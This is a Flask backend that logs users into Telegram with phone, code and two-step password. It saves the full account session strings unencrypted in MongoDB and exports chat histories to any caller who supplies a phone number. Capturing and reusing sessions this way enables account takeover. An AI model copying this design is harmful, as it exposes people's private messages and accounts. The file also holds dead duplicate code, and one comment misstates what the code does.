import asyncio
import threading
from random import randint

from dotenv import load_dotenv
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit
from telethon.errors import SessionPasswordNeededError
from telethon import TelegramClient
from telethon.sessions import StringSession
from pymongo import MongoClient
import os
import time

load_dotenv()
app = Flask(__name__)
CORS(app)  # Enable CORS for frontend communication
app.secret_key = os.getenv('SECRET_KEY')
socketio = SocketIO(app, cors_allowed_origins="*")

# MongoDB connection
mongo_client = MongoClient(os.getenv('DATABASE_URL'))
db = mongo_client["telegram_sessions"]
sessions_collection = db["sessions"]

# Telegram API credentials
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')

# Global client and loop
client = TelegramClient(StringSession(), api_id, api_hash)
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)


@app.route("/ping")
def ping():
    print("Ping received!")
    return jsonify({"status": "ok"})

@app.route("/send-code", methods=["POST"])
def send_code():
    data = request.json
    phone_number = data.get("phone")

    if not phone_number:
        return jsonify({"error": "Phone number is required"}), 400

    async def send_code_async():
        await client.connect()
        await client.send_code_request(phone_number)

    thread = threading.Thread(target=loop.run_until_complete, args=(send_code_async(),))
    thread.start()
    thread.join()

    return jsonify({"message": "Code sent successfully"}), 200

@app.route("/verify-code", methods=["POST"])
def verify_code():
    data = request.json
    phone_number = data.get("phone")
    code = data.get("code")

    if not phone_number or not code:
        return jsonify({"error": "Phone number and code are required"}), 400

    result_dict = {}

    async def verify_code_async():
        await client.connect()
        try:
            await client.sign_in(phone_number, code)
            if client.is_user_authorized():
                session_string = client.session.save()
                user_info = await client.get_me()

                session_data = {
                    "phone": phone_number,
                    "user_id": user_info.id,
                    "username": user_info.username,
                    "session_string": session_string
                }
                sessions_collection.insert_one(session_data)
                result_dict["result"] = "success"
            else:
                result_dict["result"] = "password_required"
        except SessionPasswordNeededError:
            result_dict["result"] = "password_required"
        except Exception as e:
            result_dict["result"] = str(e)

    thread = threading.Thread(target=loop.run_until_complete, args=(verify_code_async(),))
    thread.start()
    thread.join()

    if result_dict["result"] == "password_required":
        return jsonify({"message": "Password required"}), 403
    elif result_dict["result"] == "success":
        return jsonify({"message": "Login successful", "session_saved": True}), 200
    else:
        return jsonify({"error": result_dict["result"]}), 400

@app.route("/submit-password", methods=["POST"])
def submit_password():
    data = request.json
    password = data.get("password")
    phone_number = data.get("phone")

    if not phone_number or not password:
        return jsonify({"error": "Phone number and password are required"}), 400

    result_dict = {}

    async def sign_in_with_password():
        await client.connect()
        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            user_info = await client.get_me()

            session_data = {
                "phone": phone_number,
                "user_id": user_info.id,
                "username": user_info.username,
                "session_string": session_string
            }
            sessions_collection.insert_one(session_data)
            result_dict["result"] = "success"
        except Exception as e:
            result_dict["result"] = str(e)

    thread = threading.Thread(target=loop.run_until_complete, args=(sign_in_with_password(),))
    thread.start()
    thread.join()

    if result_dict["result"] == "success":
        return jsonify({"message": "Login successful", "session_saved": True}), 200
    else:
        return jsonify({"error": result_dict["result"]}), 400
@app.route("/getChatHistory", methods=["POST"])
def getChatHistory():
    print("called getChatHistory")
    data = request.json
    username = data.get("username")
    phone_number = data.get("phone")
    sid = data.get("sid")  # Get SocketIO session ID from frontend
    time.sleep(5)

    if not phone_number:
        return jsonify({"error": "Phone number is required"}), 400
    if not username:
        return jsonify({"error": "Username is required"}), 400

    session_data = sessions_collection.find_one(
        {"phone": phone_number},
        sort=[("_id", -1)]  # Sort by `_id` in descending order (latest first)
    )

    if not session_data:
        return jsonify({"error": "Session not found. Please log in first."}), 404

    session_string = session_data["session_string"]

    async def fetch_chat_history():
        print("Fetching chat history...")
        try:
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
            time.sleep(5)
            await client.connect()
            print("Connected to Telegram")

            if not await client.is_user_authorized():
                return {"error": "Session expired. Please log in again."}

            chat_data = await export_chat_history_with_updates(client, username, sid)
            return chat_data
        except Exception as e:
            return {"error": str(e)}

    chat_history = asyncio.run(fetch_chat_history())  # Run the async function synchronously

    if "error" in chat_history:
        return jsonify({"error": chat_history["error"]}), 400
    print(jsonify(chat_history))
    return jsonify(chat_history), 200  # Return chat history JSON

    async def fetch_chat_history():
        print("in Fetch")
        try:
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client.connect()
            print("connected")

            if not await client.is_user_authorized():
                socketio.emit("error", {"message": "Session expired. Please log in again."}, room=sid)
                return

            chat_data = await export_chat_history_with_updates(client, username, sid)
            socketio.emit("chat_data", chat_data, room=sid)
        except Exception as e:
            socketio.emit("error", {"message": str(e)}, room=sid)

    socketio.start_background_task(fetch_chat_history)  # Run the async function properly

    return jsonify({"message": "Fetching chat history in background"}), 202  # Indicate async processing


async def export_chat_history_with_updates(client, username, sid):
    entity = await client.get_entity(username)
    messages = []
    counter = 0

    async for message in client.iter_messages(entity, reverse=True):  # Oldest first
        msg_data = {
            "id": message.id,
            "type": "message",
            "date": message.date.strftime("%Y-%m-%dT%H:%M:%S"),
            "date_unixtime": str(int(message.date.timestamp())),
            "from": message.sender.first_name if message.sender else "Unknown",
            "from_id": f"user{message.sender_id}" if message.sender_id else "Unknown",
            "text": message.text if message.text else "",
            "text_entities": [{"type": "plain", "text": message.text}] if message.text else []
        }

        if message.media:
            msg_data["media_type"] = "photo" if hasattr(message.media, "photo") else "document"
            msg_data["file"] = "(File not included. Change data exporting settings to download.)"

        messages.append(msg_data)
        counter += 1

        if counter % 80 == 0:  # Send progress update every 100 messages
            socketio.emit("progress", {"count": counter}, room=sid)

    socketio.emit("progress", {"count": counter, "completed": True}, room=sid)
    time.sleep(randint(5,10))
    return {
        "name": entity.username or entity.first_name,
        "type": "personal_chat",
        "id": entity.id,
        "messages": messages
    }


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), threaded=True)